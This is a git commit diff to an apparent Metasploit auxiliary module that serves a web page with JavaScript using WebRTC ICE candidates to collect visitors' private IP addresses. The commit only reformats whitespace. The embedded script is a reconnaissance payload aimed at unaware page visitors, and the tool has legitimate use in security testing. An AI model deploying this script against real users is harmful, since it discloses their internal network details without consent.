70a39cd116d695da001d3fff1c663f5dc61ce6b8
Dhiraj Mishra <mishra.dhiraj95@gmail.com>
2018-01-29 17:11:50 +0530

    Update getprivate_ip_browsers.rb

--- modules/auxiliary/gather/getprivate_ip_browsers.rb
+++ modules/auxiliary/gather/getprivate_ip_browsers.rb
@@ -36,7 +36,7 @@ class MetasploitModule < Msf::Auxiliary
     @html = %|
     <script>
 function userIP(onNewIP) { 
-    var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
     var pc = new myPeerConnection({
         iceServers: []
     }),
@@ -49,22 +49,18 @@ function userIP(onNewIP) {
         if (!localIPs[ip]) onNewIP(ip);
         localIPs[ip] = true;
     }
-
-    pc.createDataChannel("");
+pc.createDataChannel("");
     pc.createOffer().then(function(sdp) {
         sdp.sdp.split('\n').forEach(function(line) {
             if (line.indexOf('candidate') < 0) return;
             line.match(ipRegex).forEach(iterateIP);
         });
-        
         pc.setLocalDescription(sdp, noop, noop);
-    }).catch(function(reason) {
-	
-    });
-
-    pc.onicecandidate = function(ice) {
-        if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
-        ice.candidate.candidate.match(ipRegex).forEach(iterateIP);
+    }).catch(function(reason) {	
+});
+pc.onicecandidate = function(ice) {
+if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
+ice.candidate.candidate.match(ipRegex).forEach(iterateIP);
     };
 }
 
